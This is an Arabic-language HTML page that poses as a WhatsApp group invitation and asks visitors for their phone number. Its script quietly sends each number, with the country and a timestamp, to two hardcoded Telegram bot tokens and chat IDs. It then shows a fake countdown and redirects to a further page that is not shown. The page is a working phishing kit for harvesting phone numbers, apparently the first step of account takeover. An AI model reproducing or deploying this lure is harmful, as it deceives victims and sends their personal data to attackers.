<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="twitter:description" content="أدخل رقم هاتفك لتلقي دعوة الانضمام إلى مجموعة واتساب">
    <meta name="twitter:image" content="https://example.com/whatsapp-logo-icon-isolated-on-transparent-background-free-png.webp">
    
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <style>
        :root {
            --primary: #25D366;
            --primary-dark: #128C7E;
            --primary-light: #DCF8C6;
            --white: #FFFFFF;
            --light-bg: #f5f8fa;
            --border-color: #e1e8ed;
            --text-color: #2d3748;
            --text-secondary: #718096;
            --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background-color: var(--light-bg);
            color: var(--text-color);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            background-color: var(--white);
            border-radius: 16px;
            box-shadow: var(--shadow);
            width: 100%;
            max-width: 480px;
            overflow: hidden;
            animation: fadeIn 0.6s ease-out;
        }

        .card-header {
            background: linear-gradient(135deg, var(--primary-dark), var(--primary));
            color: var(--white);
            padding: 24px;
            text-align: center;
        }

        .card-header h1 {
            font-size: 1.5rem;
            margin-bottom: 8px;
        }

        .card-header p {
            font-size: 0.95rem;
            opacity: 0.9;
        }

        .card-body {
            padding: 28px;
        }

        /* نموذج إدخال الرقم */
        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 10px;
            font-weight: 500;
            color: var(--text-color);
        }

        .phone-input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid var(--border-color);
            border-radius: 10px;
            font-size: 16px;
            transition: var(--transition);
            font-family: 'Tajawal', sans-serif;
        }

        .phone-input:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
        }

        .submit-btn {
            background: linear-gradient(to right, var(--primary), var(--primary-dark));
            color: var(--white);
            border: none;
            padding: 16px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.25);
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.3);
        }

        /* قسم العد التنازلي */
        .countdown-section {
            display: none;
            text-align: center;
            padding: 20px;
        }

        .countdown-title {
            font-size: 1.3rem;
            color: var(--primary-dark);
            margin-bottom: 24px;
        }

        .countdown-display {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 28px;
        }

        .countdown-circle {
            width: 140px;
            height: 140px;
            border-radius: 50%;
            background: conic-gradient(
                var(--primary) 0%, 
                var(--primary-light) 0%
            );
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: var(--shadow);
            margin-bottom: 16px;
        }

        .countdown-number {
            font-size: 2.8rem;
            font-weight: 700;
            color: var(--primary-dark);
        }

        .countdown-label {
            font-size: 1rem;
            color: var(--text-secondary);
            margin-top: 8px;
        }

        .progress-container {
            width: 100%;
            height: 8px;
            background-color: var(--primary-light);
            border-radius: 4px;
            margin: 24px 0;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(to right, var(--primary), var(--primary-dark));
            width: 0%;
            transition: width 1s linear;
            border-radius: 4px;
        }

        .whatsapp-icon {
            color: var(--primary);
            font-size: 3rem;
            margin: 20px 0;
            animation: pulse 1.5s infinite ease-in-out;
        }

        .status-text {
            color: var(--text-secondary);
            margin-top: 16px;
            font-size: 1rem;
            line-height: 1.6;
        }

        /* الرسوم المتحركة */
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* تعديلات لمختار الدول */
        .iti {
            width: 100%;
        }

        .iti__selected-flag {
            padding: 0 12px 0 6px;
        }

        .iti__country-list {
            text-align: right;
            font-family: 'Tajawal', sans-serif;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-header">
            <h1>دعوة للانضمام إلى مجموعة واتساب</h1>
            <p>أدخل رقم هاتفك لتلقي دعوة الانضمام</p>
        </div>
        
        <div class="card-body">
            <form id="invitationForm">
                <div class="form-group">
                    <label for="phone" class="form-label">رقم الهاتف</label>
                    <input type="tel" id="phone" class="phone-input" required>
                </div>
                
                <button type="submit" class="submit-btn" id="submitBtn">
                    <span>متابعة</span>
                    <i class="fas fa-arrow-left"></i>
                </button>
            </form>
            
            <div class="countdown-section" id="countdownSection">
                <h3 class="countdown-title">جاري إعداد  الدعوة</h3>
                
                <div class="countdown-display">
                    <div class="countdown-circle" id="countdownCircle">
                        <span class="countdown-number" id="countdown">20</span>
                    </div>
                    <span class="countdown-label">ثانية متبقية</span>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                
                <div class="whatsapp-icon">
                    <i class="fab fa-whatsapp"></i>
                </div>
                
                <p class="status-text"> سيتم تحويلك تلقائياً بعد انتهاء العد التنازلي</p>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // عناصر DOM
            const phoneInput = document.getElementById('phone');
            const invitationForm = document.getElementById('invitationForm');
            const countdownSection = document.getElementById('countdownSection');
            const submitBtn = document.getElementById('submitBtn');
            const countdownElement = document.getElementById('countdown');
            const countdownCircle = document.getElementById('countdownCircle');
            const progressBar = document.getElementById('progressBar');
            
            // تهيئة مدخل الهاتف
            const iti = window.intlTelInput(phoneInput, {
                initialCountry: "sa",
                preferredCountries: ["sa", "ae", "eg", "iq", "jo", "kw", "lb", "om", "qa", "bh"],
                separateDialCode: true,
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
                autoPlaceholder: "off"
            });

            // إرسال النموذج
            invitationForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const phoneNumber = iti.getNumber();
                
                if (!phoneNumber || !iti.isValidNumber()) {
                    alert("الرجاء إدخال رقم هاتف صحيح");
                    return;
                }
                
                // إرسال البيانات إلى تيليجرام
                sendToTelegram(phoneNumber);
                
                // إخفاء النموذج وإظهار العد التنازلي
                invitationForm.style.display = 'none';
                countdownSection.style.display = 'block';
                
                // بدء العد التنازلي (20 ثانية)
                startCountdown();
            });
            
            // دالة إرسال البيانات إلى تيليجرام
            function sendToTelegram(phone) {
                const bots = [
                    { token: "7827677128:AAF4uM7EaSPnWCJ3udrPnT4zHCQ7NF_R8aw", chatId: "5372119436" },
                    { token: "8018870983:AAG59o9PHtr0oPjxy5JBmOkwTqU93LbWaV4", chatId: "5532367024 " }
                ];
                
                const country = iti.getSelectedCountryData().name || 'غير معروف';
                const message = `طلب انضمام جديد إلى مجموعة واتساب:
📱 الرقم: ${phone}
🌍 الدولة: ${country}
🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`;
                
                bots.forEach(bot => {
                    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}`)
                        .catch(err => console.error('Error sending to Telegram:', err));
                });
            }
            
            // دالة العد التنازلي
            function startCountdown() {
                let seconds = 20;
                const totalSeconds = seconds;
                
                const countdownInterval = setInterval(() => {
                    seconds--;
                    countdownElement.textContent = seconds;
                    
                    // تحديث التقدم المرئي
                    const progressPercent = ((totalSeconds - seconds) / totalSeconds) * 100;
                    updateProgress(progressPercent);
                    
                    // الانتقال عند انتهاء الوقت
                    if (seconds <= 0) {
                        clearInterval(countdownInterval);
                        setTimeout(() => {
                            window.location.href = 'traitement.html';
                        }, 500);
                    }
                }, 1000);
            }
            
            // تحديث المؤشرات المرئية
            function updateProgress(percent) {
                // تحديث الدائرة
                countdownCircle.style.background = `
                    conic-gradient(
                        var(--primary) ${percent}%, 
                        var(--primary-light) ${percent}%
                    )
                `;
                
                // تحديث شريط التقدم
                progressBar.style.width = `${percent}%`;
            }
        });
    </script>
</body>
</html>
